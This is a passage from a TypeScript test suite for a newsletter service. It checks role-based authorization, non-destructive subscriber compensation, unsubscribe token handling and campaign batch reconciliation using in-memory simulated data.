  it("should enforce null-safe database authorization for RPC caller roles", () => {
    function simulateDatabaseAuthorization(
      role: string | null | undefined,
      isAdmin: boolean
    ): { authorized: boolean; error?: string } {
      // Replicates: (auth.role() IS DISTINCT FROM 'service_role') AND NOT EXISTS (...)
      const isServiceRole = role === "service_role";
      if (!isServiceRole && !isAdmin) {
        return {
          authorized: false,
          error: "Unauthorized: newsletter admin or service role privileges required",
        };
      }
      return { authorized: true };
    }

    // Service role always authorized
    assert.equal(simulateDatabaseAuthorization("service_role", false).authorized, true);

    // Authenticated admin authorized
    assert.equal(simulateDatabaseAuthorization("authenticated", true).authorized, true);

    // Authenticated non-admin rejected
    assert.equal(simulateDatabaseAuthorization("authenticated", false).authorized, false);

    // Anon rejected
    assert.equal(simulateDatabaseAuthorization("anon", false).authorized, false);

    // NULL / Undefined role strictly rejected (null-safe)
    assert.equal(simulateDatabaseAuthorization(null, false).authorized, false);
    assert.equal(simulateDatabaseAuthorization(undefined, false).authorized, false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 10. NON-DESTRUCTIVE SUBSCRIBER COMPENSATION & CONCURRENCY
// ─────────────────────────────────────────────────────────────────────────────

describe("Non-Destructive Subscriber Compensation & Concurrency Safety", () => {
  interface SubscriberDbRow {
    id: string;
    email: string;
    status: string;
    consent_given: boolean;
    first_name: string | null;
    unsubscribed_at: string | null;
  }

  it("should restore exact prior state on reactivation failure without blind unsubscription", () => {
    const db = new Map<string, SubscriberDbRow>();
    const priorRow: SubscriberDbRow = {
      id: "sub-101",
      email: "artisan@kauseyah.com",
      status: "pending_verification", // custom non-active prior status
      consent_given: false,
      first_name: "Meera",
      unsubscribed_at: null,
    };
    db.set("sub-101", { ...priorRow });

    // Step 1: Reactivation attempt updates row
    const target = db.get("sub-101")!;
    target.status = "active";
    target.consent_given = true;

    // Step 2: Consent audit fails -> compensation logic runs
    const auditFailed = true;
    if (auditFailed) {
      // Revert to exact prior state
      target.status = priorRow.status;
      target.consent_given = priorRow.consent_given;
      target.first_name = priorRow.first_name;
      target.unsubscribed_at = priorRow.unsubscribed_at;
    }

    assert.equal(db.get("sub-101")?.status, "pending_verification", "Must restore exact prior status");
    assert.equal(db.get("sub-101")?.consent_given, false);
  });

  it("should never delete records by email during new subscriber compensation", () => {
    const db = new Map<string, SubscriberDbRow>();

    // Initial state: User 1 exists
    db.set("id-1", {
      id: "id-1",
      email: "himani@kauseyah.com",
      status: "active",
      consent_given: true,
      first_name: "Himani",
      unsubscribed_at: null,
    });

    // Simulating concurrent request or new subscriber registration with same email
    const newRecordId = "id-2";
    db.set(newRecordId, {
      id: newRecordId,
      email: "himani@kauseyah.com",
      status: "active",
      consent_given: true,
      first_name: "Himani",
      unsubscribed_at: null,
    });

    // If compensation deleted by email, id-1 would be lost!
    // Non-destructive compensation updates ONLY by specific ID:
    const newRecord = db.get(newRecordId);
    if (newRecord) {
      newRecord.status = "unsubscribed";
      newRecord.consent_given = false;
    }

    // Verify User 1 was not affected
    assert.equal(db.get("id-1")?.status, "active", "Existing subscriber must remain untouched");
    assert.equal(db.get("id-2")?.status, "unsubscribed", "Only failed row is updated");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 11. UNSUBSCRIBE TOKEN VALIDATION & SUPPRESSION IDEMPOTENCY
// ─────────────────────────────────────────────────────────────────────────────

describe("Unsubscribe Token Validation & Suppression Idempotency", () => {
  interface UnsubscribeState {
    id: string;
    email: string;
    token: string;
    status: "active" | "unsubscribed";
    unsubscribed_at: string | null;
  }

  function simulateUnsubscribe(
    store: Map<string, UnsubscribeState>,
    token: string | null | undefined
  ): { status: number; message: string; alreadyUnsubscribed?: boolean } {
    if (!token || token.trim().length === 0) {
      return { status: 400, message: "Missing or invalid unsubscribe token." };
    }

    let found: UnsubscribeState | undefined;
    for (const sub of store.values()) {
      if (sub.token === token) {
        found = sub;
        break;
      }
    }

    if (!found) {
      return { status: 404, message: "Subscriber not found or token expired." };
    }

    if (found.status === "unsubscribed") {
      return { status: 200, message: "Already unsubscribed.", alreadyUnsubscribed: true };
    }

    found.status = "unsubscribed";
    found.unsubscribed_at = new Date().toISOString();
    return { status: 200, message: `Unsubscribed ${found.email} successfully.` };
  }

  it("should reject missing, empty, or invalid unsubscribe tokens", () => {
    const store = new Map<string, UnsubscribeState>();
    assert.equal(simulateUnsubscribe(store, null).status, 400);
    assert.equal(simulateUnsubscribe(store, "").status, 400);
    assert.equal(simulateUnsubscribe(store, "non_existent_token").status, 404);
  });

  it("should process unsubscribe idempotently without duplicate errors", () => {
    const store = new Map<string, UnsubscribeState>();
    store.set("sub-1", {
      id: "sub-1",
      email: "subscriber@kauseyah.com",
      token: "valid_token_abc_123",
      status: "active",
      unsubscribed_at: null,
    });

    // First call: successfully unsubscribes
    const firstCall = simulateUnsubscribe(store, "valid_token_abc_123");
    assert.equal(firstCall.status, 200);
    assert.equal(store.get("sub-1")?.status, "unsubscribed");
    assert.ok(store.get("sub-1")?.unsubscribed_at !== null);

    // Second call: idempotent, returns already unsubscribed
    const secondCall = simulateUnsubscribe(store, "valid_token_abc_123");
    assert.equal(secondCall.status, 200);
    assert.equal(secondCall.alreadyUnsubscribed, true);
    assert.equal(store.get("sub-1")?.status, "unsubscribed");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 12. EMPTY CAMPAIGN & BATCH INTERRUPTION RECONCILIATION
// ─────────────────────────────────────────────────────────────────────────────

describe("Empty Campaign & Batch Interruption Reconciliation", () => {
  it("should reconcile empty campaign as sent/completed with zero counts", () => {
    interface Campaign {
      id: string;
      status: string;
      sent_count: number;
      failed_count: number;
      recipient_count: number;
    }

    const campaign: Campaign = {
      id: "camp-empty",
      status: "draft",
      sent_count: 0,
      failed_count: 0,
      recipient_count: 0,
    };

    const logs: any[] = []; // Zero logs

    function reconcileEmpty(c: Campaign, logList: any[]) {
      const isComplete = logList.length === 0;
      return {
        campaignId: c.id,
        status: isComplete ? "sent" : "sending",
        sentCount: 0,
        failedCount: 0,
        isComplete,
      };
    }

    const res = reconcileEmpty(campaign, logs);
    assert.equal(res.isComplete, true);
    assert.equal(res.status, "sent");
    assert.equal(res.sentCount, 0);
  });

  it("should clamp client-supplied batchSize between 1 and 100", () => {
    function clampBatchSize(batchSize: any): number {
      return typeof batchSize === "number" && !isNaN(batchSize)
        ? Math.min(Math.max(Math.floor(batchSize), 1), 100)
        : 15;
    }

    assert.equal(clampBatchSize(undefined), 15);
    assert.equal(clampBatchSize(NaN), 15);
    assert.equal(clampBatchSize(-5), 1);
    assert.equal(clampBatchSize(0), 1);
    assert.equal(clampBatchSize(25.8), 25);
    assert.equal(clampBatchSize(100), 100);
    assert.equal(clampBatchSize(500), 100);
  });
});
